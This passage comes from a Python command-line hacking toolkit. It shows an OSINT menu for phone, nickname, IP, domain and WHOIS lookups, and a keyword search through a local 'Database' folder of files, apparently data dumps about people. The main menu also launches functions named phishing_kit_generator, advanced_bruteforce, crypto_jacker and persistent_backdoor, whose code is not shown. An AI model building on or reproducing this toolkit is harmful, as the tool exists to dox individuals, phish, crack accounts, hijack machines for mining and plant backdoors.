                        return

                    print(f"\n{w}[{w}*{w}]{w} Searching '{search_keyword}' in '{root_folder}'...")

                    if not os.path.exists(root_folder) or not os.path.isdir(root_folder):
                        print(f"{r}[{w}!{r}]{w} Folder '{root_folder}' not found.")
                        print(f"{y}[{w}!{y}]{w} Create 'Database' folder and add files for search")
                        return

                    for dirpath, dirnames, filenames in os.walk(root_folder):
                        for filename in filenames:
                            full_path = os.path.join(dirpath, filename)
                            processed_files_count += 1
                            
                            if processed_files_count % 50 == 0:
                                print(f"{w}[{w}*{w}]{w} Processed files: {processed_files_count}...")

                            try:
                                with open(full_path, 'r', encoding='utf-8', errors='ignore') as infile:
                                    for line_num, line in enumerate(infile, 1):
                                        if search_keyword_lower in line.lower():
                                            print(f"{g}[+]{w} {full_path} (line {line_num}): {line.strip()}")
                                            found_count += 1
                            except Exception as e:
                                continue

                    print(f"\n{g}[+]{w} Search completed!")
                    print(f"{g}[+]{w} Processed files: {processed_files_count}")
                    print(f"{g}[+]{w} Matches found: {found_count}")
                    
                    if found_count == 0:
                        print(f"{y}[{w}!{y}]{w} No matches found. Try another query.")

                while True:
                    print(f"\n{w}[1]{w} Phone search")
                    print(f"{w}[2]{w} Domain search") 
                    print(f"{w}[3]{w} Nickname search")
                    print(f"{w}[4]{w} IP search")
                    print(f"{w}[5]{w} WHOIS information")
                    print(f"{w}[6]{w} Database search")
                    print(f"{w}[0]{w} Back to main menu")
                    
                    choice = safe_input(f"\n{w}[{w}?{w}]{w} Select search type: ")
                    
                    if choice == "1":
                        phone = safe_input(f"{w}[{w}?{w}]{w} Enter phone number: ")
                        result = osint_phone_lookup(phone)
                        print(f"\n{result}")
                        
                    elif choice == "2":
                        domain = safe_input(f"{w}[{w}?{w}]{w} Enter domain: ")
                        result = osint_get_domain_info(domain)
                        print(f"\n{result}")
                        
                    elif choice == "3":
                        nick = safe_input(f"{w}[{w}?{w}]{w} Enter nickname: ")
                        print(f"\n{w}[{w}*{w}]{w} Checking account availability...")
                        result = osint_check_account_availability(nick)
                        print(f"\n{result}")
                        
                    elif choice == "4":
                        ip = safe_input(f"{w}[{w}?{w}]{w} Enter IP address: ")
                        result = osint_search_by_ip_api(ip)
                        print(f"\n{result}")
                        
                    elif choice == "5":
                        domain = safe_input(f"{w}[{w}?{w}]{w} Enter domain for WHOIS: ")
                        result = osint_get_domain_info(domain)
                        print(f"\n{result}")
                    
                    elif choice == "6":
                        while True:
                            print(f"\n{c}[{w}*{c}]{w} Database Search")
                            print(f"{w}[1]{w} Search in categories")
                            print(f"{w}[2]{w} Search all files")
                            print(f"{w}[0]{w} Back")
                            
                            sub_choice = safe_input(f"\n{w}[{w}?{w}]{w} Select option: ")
                            
                            if sub_choice == "1":
                                database_root_folder = 'Database'
                                if not os.path.exists(database_root_folder):
                                    print(f"{r}[{w}!{r}]{w} Folder '{database_root_folder}' not found.")
                                    break
                                
                                categories = [item for item in os.listdir(database_root_folder) 
                                            if os.path.isdir(os.path.join(database_root_folder, item))]
                                
                                if not categories:
                                    print(f"{r}[{w}!{r}]{w} No categories in folder.")
                                    break
                                
                                print(f"\n{w}Available categories:")
                                for i, category in enumerate(categories):
                                    print(f"{w}[{i+1}]{w} {category}")
                                print(f"{w}[0]{w} Cancel")
                                
                                cat_choice = safe_input(f"\n{w}[{w}?{w}]{w} Select category: ")
                                if cat_choice == "0":
                                    continue
                                
                                try:
                                    cat_index = int(cat_choice) - 1
                                    if 0 <= cat_index < len(categories):
                                        selected_folder = os.path.join(database_root_folder, categories[cat_index])
                                        text_to_find = safe_input(f"{w}[{w}?{w}]{w} Text to search in '{categories[cat_index]}': ")
                                        osint_search_in_databases_category(selected_folder, text_to_find)
                                    else:
                                        print(f"{r}[{w}!{r}]{w} Invalid choice")
                                except ValueError:
                                    print(f"{r}[{w}!{r}]{w} Invalid input")
                            
                            elif sub_choice == "2":
                                search_term = safe_input(f"{w}[{w}?{w}]{w} Text to search in all files: ")
                                osint_search_all_files_and_print_results(search_term)
                            
                            elif sub_choice == "0":
                                break
                            else:
                                print(f"{r}[{w}!{r}]{w} Invalid choice")
                    
                    elif choice == "0":
                        break
                    else:
                        print(f"{r}[{w}!{r}]{w} Invalid choice")
                
                cont()
            elif select == '14':
                phishing_kit_generator()
            elif select == '15':
                advanced_bruteforce()
            elif select == '16':
                wifi_auditor()
            elif select == '17':
                crypto_jacker()
            elif select == '18':
                persistent_backdoor()
            elif select == '88':
                quit()

        except Exception:
            print(f"{r}[{w}ERROR{r}]{w} Error:\n {traceback.format_exc()}")
            cont()

main_screen()
